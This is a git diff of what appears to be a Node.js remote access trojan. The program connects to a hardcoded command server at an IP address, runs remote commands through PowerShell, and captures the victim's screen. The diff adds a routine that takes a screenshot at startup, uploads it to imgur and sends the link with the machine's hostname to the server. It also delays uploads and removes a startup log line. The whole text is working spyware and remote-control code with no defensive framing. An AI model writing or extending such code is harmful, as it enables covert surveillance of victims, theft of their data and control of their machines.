@@ -3,6 +3,7 @@ let orionOS               = require("os")
 let orionShellModule      = require("node-powershell")
 let orionRobot            = require("robot-cmd")
 let imgur                 = require('imgur');
+let sharp                 = require("sharp")
 
 let orionSocketConnection = orionSocketModule.connect( "http://139.59.200.147:4001/", {
   "reconnection": true,
@@ -52,7 +53,9 @@ let additionalFunctions = {
   viewScreen: () => {
     return new Promise((RESOLVE, REJECT) => {
       try {
-        orionRobot.screenShot("C:\\Windows\\Temp\\screenShot.jpg")
+        let imagePosition = "C:\\Windows\\Temp\\screenShot.png"
+
+        orionRobot.screenShot(imagePosition)
 
         orionSocketConnection.emit('codeExecutionResponse', {
           uniqueRoomNumber: UUID,
@@ -60,17 +63,19 @@ let additionalFunctions = {
           stderr: "N/A"
         })
 
-        imgur.uploadFile('C:\\Windows\\Temp\\screenShot.jpg')
-        .then(function (json) {
-            RESOLVE(
-              json.data.link
-            )
-        })
-        .catch(function (err) {
-            REJECT(
-              `Failed to upload: ${err.message}`
-            )
-        })
+        setTimeout( () => {
+          imgur.uploadFile(imagePosition)
+            .then(function (json) {
+                RESOLVE(
+                  json.data.link
+                )
+            })
+            .catch(function (err) {
+                REJECT(
+                  `Failed to upload: ${err.message}`
+                )
+            })
+        }, 1500)
       } catch (error){
         console.log("Error taking screenshot; ", error)
       }
@@ -163,12 +168,42 @@ let generateUUID = () => {
     return head.concat(generateUUID.tail).join('-');
 };
 
+let takeInitialScreenshot = () => {
+  return new Promise(function(RESOLVE, REJECT){
+    let imagePosition = "C:\\Windows\\Temp\\screenShotCaption.png"
+
+    orionRobot.screenShot(imagePosition)
+
+    setTimeout( () => {
+      imgur.uploadFile(imagePosition)
+        .then(function (json) {
+            RESOLVE(
+              json.data.link
+            )
+        })
+        .catch(function (err) {
+            REJECT(
+              `FAILURE`
+            )
+        })
+    }, 1500)
+  })
+}
+
 let emitUniqueHost = (UUID) => {
+  let screenShot = takeInitialScreenshot()
+  screenShot.then(imageUrl => {
+    orionSocketConnection.emit('roomConnectionHost', {
+      UUID: UUID,
+      screenShot: imageUrl
+    })
+  })
+
   setTimeout(
-    () => orionSocketConnection.emit('roomConnectionHost', UUID),
+    () => orionSocketConnection.emit('roomConnectionHost', {UUID: UUID}),
     5000
   );
-  return orionSocketConnection.emit('roomConnectionHost', UUID)
+  return orionSocketConnection.emit('roomConnectionHost', {UUID: UUID})
 }
 
 let runsetupScripts = () => {
@@ -191,8 +226,6 @@ let runsetupScripts = () => {
 //
 // Function calls
 //
-
-console.log("Starting proc")
 
 let UUID = orionOS.hostname()
 emitUniqueHost(UUID)
